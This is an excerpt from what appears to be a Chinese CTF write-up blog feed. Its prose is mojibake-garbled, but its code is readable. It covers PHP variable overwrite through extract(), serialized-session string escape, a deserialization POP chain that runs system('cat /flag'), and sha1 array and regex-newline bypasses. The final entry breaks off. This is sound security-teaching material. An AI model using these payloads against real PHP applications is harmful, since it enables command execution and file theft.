å‡½æ•°<br>ä½œç”¨æ˜¯ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚<br>è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚é’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡<br>æ›´å…·ä½“çš„ç”¨æ³•å‚è€ƒ<a href="https://www.runoob.com/php/func-array-extract.html">https://www.runoob.com/php/func-array-extract.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Original&quot;</span>;<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;Cat&quot;</span>, <span class="hljs-string">&quot;b&quot;</span> =&gt; <span class="hljs-string">&quot;Dog&quot;</span>, <span class="hljs-string">&quot;c&quot;</span> =&gt; <span class="hljs-string">&quot;Horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>, EXTR_PREFIX_SAME, <span class="hljs-string">&quot;dup&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span> = <span class="hljs-subst">$a</span>; <span class="hljs-subst">$b</span> = <span class="hljs-subst">$b</span>; <span class="hljs-subst">$c</span> = <span class="hljs-subst">$c</span>; <span class="hljs-subst">$dup_a</span> = <span class="hljs-subst">$dup_a</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>ç»“æœï¼š<span class="hljs-variable">$a</span> = Original; <span class="hljs-variable">$b</span> = Dog; <span class="hljs-variable">$c</span> = Horse; <span class="hljs-variable">$dup_a</span> = Cat<br></code></pre></td></tr></table></figure><p>åœ¨è¿™é“é¢˜ç›®é‡Œè¿™ä¸ªå‡½æ•°æ¥æ”¶äº†postä¼ è¾“çš„æ•°æ®<br>å¦‚æœä½ ä¼ å…¥çš„æ˜¯** _SESSION[flag]** <br>é‚£ä¹ˆä»–å°±ä¼šè¦†ç›–ä¹‹å‰çš„**$_SESSION[â€œuserâ€]å’Œ$_SESSION[â€œfunctionâ€]**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;a&quot;</span>] = <span class="hljs-string">&#x27;aa&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;b&quot;</span>] = <span class="hljs-string">&#x27;bb&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-meta">?&gt;</span><br>postï¼š<br>_SESSION[cc]=<span class="hljs-number">1</span><br>ç»“æœï¼š<br><span class="hljs-keyword">array</span>(<span class="hljs-number">2</span>) &#123; [<span class="hljs-string">&quot;a&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;aa&quot;</span> [<span class="hljs-string">&quot;b&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;bb&quot;</span> &#125; <br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123; [<span class="hljs-string">&quot;cc&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span> &#125; <br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°postä¼ è¾“çš„å‚æ•°é‡Œçš„ccè¢«è‡ªåŠ¨åŠ ä¸Šäº†åŒå¼•å·ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªå°ç»†èŠ‚<br><strong>æ­¥éª¤</strong><br>éšä¾¿ç»™$_SESSIONå˜é‡èµ‹å€¼çœ‹çœ‹æ€ä¹ˆæ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&quot;woai&quot;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;function&quot;</span>] = <span class="hljs-string">&quot;yuanshen&quot;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>);<br>è¿è¡Œç»“æœï¼š<br>a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;woai&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;function&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;yuanshen&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹å‘ç°åªæœ‰userå’Œfunctionçš„å€¼æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ©ç”¨å¯æ§çš„å€¼æ¥ä½¿å¾—å­—ç¬¦ä¸²é€ƒé€¸å‡ºæ¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;flagflagflagflagflagflag&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;function&quot;</span>] =<span class="hljs-string">&#x27;1&quot;;s:8:&quot;function&quot;;s:1:&quot;s&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>postä¼ å‚(_SESSIONå‰é¢æ²¡$æ˜¯å› ä¸ºåŠ ä¸Šä¹‹åä¼šå°±å¯¼è‡´å˜é‡åå­—å˜æˆäº†$$_SESSION)ï¼š<br><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=1&quot;;s:8:&quot;function&quot;;s:1:&quot;s&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code><br>åé¢æŸ¥çœ‹æºä»£ç æç¤ºflagåœ¨flag in &#x2F;d0g3_fllllllag<br>ç„¶åæŠŠä¼ å‚çš„imgçš„å€¼æ”¹ä¸€ä¸‹å°±å¥½äº†</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€FSCTF 2023ã€‘ez_php2</title>
    <link href="/2024/08/10/%5BFSCTF%202023%5Dez_php2/"/>
    <url>/2024/08/10/%5BFSCTF%202023%5Dez_php2/</url>
    
    <content type="html"><![CDATA[<p>æºç å¥‰ä¸Š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br>Class Rd&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ending</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cl</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;All matters have concluded&quot;</span>;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;ending);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arg</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arg</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt;<span class="hljs-variable">$value</span>)<br>        &#123;<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;POC&#x27;</span>]==<span class="hljs-string">&quot;1111&quot;</span>)<br>            &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;cl-&gt;var1 = <span class="hljs-string">&quot;system&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Poc</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$payload</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fun</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;payload = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;fun = <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"><span class="hljs-variable">$paylaod</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have you genuinely accomplished what you set out to do?&quot;</span>;<br>        <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$paylaod</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Er</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$symbol</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Flag</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;symbol = True;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$value</span>(<span class="hljs-variable language_">$this</span>-&gt;Flag);<br>    &#125;<br><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ha</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;start1.<span class="hljs-string">&quot;__construct&quot;</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;start2===<span class="hljs-string">&quot;11111&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;start1-&gt;<span class="hljs-title function_ invoke__">Love</span>(<span class="hljs-variable">$this</span>-&gt;start);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are Good!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Ha_rde_r&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Ha_rde_r&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;You are Silly goose!&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>ä»£ç å®¡è®¡æ„é€ popé“¾</strong><br><code>Ha_destruct-&gt;Rd_call-&gt;Er_set</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>Class Rd&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ending</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cl</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Er</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$symbol</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Flag</span> = <span class="hljs-string">&quot;cat /flag&quot;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ha</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;POC&quot;</span>=&gt;<span class="hljs-string">&quot;1111&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start2</span>=<span class="hljs-string">&quot;11111&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ha</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Er</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rd</span>();<br><span class="hljs-variable">$a</span>-&gt;start1 = <span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$a</span>-&gt;start1-&gt;cl = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€é¹¤åŸæ¯ 2021ã€‘Middle magic</title>
    <link href="/2024/08/10/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DMiddle%20magic/"/>
    <url>/2024/08/10/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DMiddle%20magic/</url>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./flag.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./result.php&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &lt; <span class="hljs-number">20</span>)&#123;<br><br>  <span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class="hljs-string">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]);<br><br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/pass_the_level_1#/&#x27;</span>, <span class="hljs-variable">$aaa</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 2&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])) &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] == <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-comment">// START FORM PROCESSING    </span><br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;root_pwd&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;level_3&#x27;</span>])) &#123;<br>          <span class="hljs-variable">$level_3</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;level_3&#x27;</span>]);<br><br>          <span class="hljs-keyword">if</span> (<span class="hljs-variable">$level_3</span>-&gt;result == <span class="hljs-variable">$result</span>) &#123;<br><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success:&quot;</span>.<span class="hljs-variable">$flag</span>;<br>          &#125;<br>          <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you never beat me!&quot;</span>;<br>          &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;out&quot;</span>;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span>&#123;<br><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>      &#125;<br>      <span class="hljs-comment">// perform validations on the form data</span><br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;<br>    &#125;<br><br>  &#125;<br><br>  <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonono!&#x27;</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br>&#125;<br><br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é“é¢˜æœ‰ä¸‰ä¸ªifï¼Œåˆ†åˆ«æ˜¯<br>1.ç¬¬ä¸€ä¸ªifè¦æ±‚<code>aaa=pass_the_level_1</code><br>2.ç¬¬äºŒä¸ªifè¦æ±‚ä¼ å…¥ä¸¤ä¸ªä¸ç›¸ç­‰å˜é‡<code>admin</code>å’Œ<code>root_pwd</code>ä¸¤è€…sha1åŠ å¯†åç›¸ç­‰ï¼›<br>3.ç¬¬ä¸‰ä¸ªifè¦æ±‚ä¼ å…¥<code>level_3</code>ï¼Œå¯¹å…¶è¿›è¡Œjsonè§£ç ä¹‹åï¼Œéœ€è¦<code>$level_3-&gt;result == $result</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">json_decode</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$json</span> [, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$assoc</span> = <span class="hljs-literal">false</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$depth</span> = <span class="hljs-number">512</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$options</span> = <span class="hljs-number">0</span>]]] )<br><span class="hljs-comment">//json_decodeæ¥å—ä¸€ä¸ªJSONæ ¼å¼çš„å­—ç¬¦ä¸²å¹¶ä¸”æŠŠå®ƒè½¬æ¢ä¸ºPHPå˜é‡,å½“è¯¥å‚æ•°assocä¸ºTRUEæ—¶ï¼Œå°†è¿”å›arrayï¼Œå¦åˆ™è¿”å›objectã€‚</span><br></code></pre></td></tr></table></figure><p><strong>ç¬¬ä¸€ä¸ªif</strong><br>å› ä¸ºpreg_replaceå‡½æ•°åªèƒ½åŒ¹é…ä¸€è¡Œçš„æ•°æ®ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€å…ˆä¼ å…¥æ¢è¡Œç¬¦ï¼Œé‚£ä¹ˆåé¢çš„ä¼ å…¥ä¾¿ä¸å†è¢«åŒ¹é…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?aaa=%<span class="hljs-number">0</span>apass_the_level_1%<span class="hljs-number">23</span><br><span class="hljs-comment">//è¿™é‡Œè§£é‡Šä¸€ä¸‹%23ï¼Œè¿™æ˜¯ï¼ƒçš„urlç¼–ç ï¼Œç›´æ¥ä¼ å…¥#æ˜¯ä¸è¡Œçš„ï¼Œæµè§ˆå™¨ä¼šå°†å®ƒè§†ä½œurlçš„æŒ‡ç¤ºç¬¦å·ï¼Œå¯ä»¥å»äº†è§£ä¸€ä¸‹urlçš„æ„æˆå°±èƒ½ç†è§£äº†ï¼ˆä¸ªäººçš„ç†è§£ï¼Œè½»ç‚¹å–·ï¼‰</span><br></code></pre></td></tr></table></figure><p><strong>ç¬¬äºŒä¸ªif</strong><br>ç›´æ¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œsha1åŠ å¯†æ—¶ï¼Œè‹¥ä¼ å…¥çš„æ˜¯æ•°ç»„ï¼Œè¿”å›å€¼ä¸ºnull</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">admin[]=<span class="hljs-number">1</span>&amp;root_pwd[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><strong>ç¬¬ä¸‰ä¸ªif</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 